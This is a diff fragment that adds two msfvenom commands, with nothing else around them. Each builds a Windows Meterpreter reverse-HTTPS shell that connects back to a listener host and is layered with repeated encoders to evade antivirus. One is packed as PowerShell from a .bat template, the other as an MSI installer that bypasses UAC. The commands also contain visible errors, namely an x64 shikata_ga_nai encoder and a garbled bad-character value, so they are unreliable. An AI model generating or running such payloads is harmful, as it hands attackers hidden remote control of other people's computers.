@@ -1,0 +1,5 @@
+msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -a x64 --platform windows -e x64/countdown -i 8 -f raw -x /root/Desktop/example.bat | msfvenom -a x64 --platform windows -e x64/call4_dword_xor -i 7 -f raw | msfvenom -a x64 --platform windows -e x64/shikata_ga_nai -i 9 -b '\x00\x0a\xff/x0d' -f psh
+
+
+
+msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -a x64 --platform windows -e x64/countdown -i 8 -f raw | msfvenom -a x64 --platform windows -e x64/call4_dword_xor -i 7 -f raw | msfvenom -a x64 --platform windows -e x64/shikata_ga_nai -i 9 -b '\x00\x0a\xff/x0d' -f msi-nouac -o /root/output/payload.msi
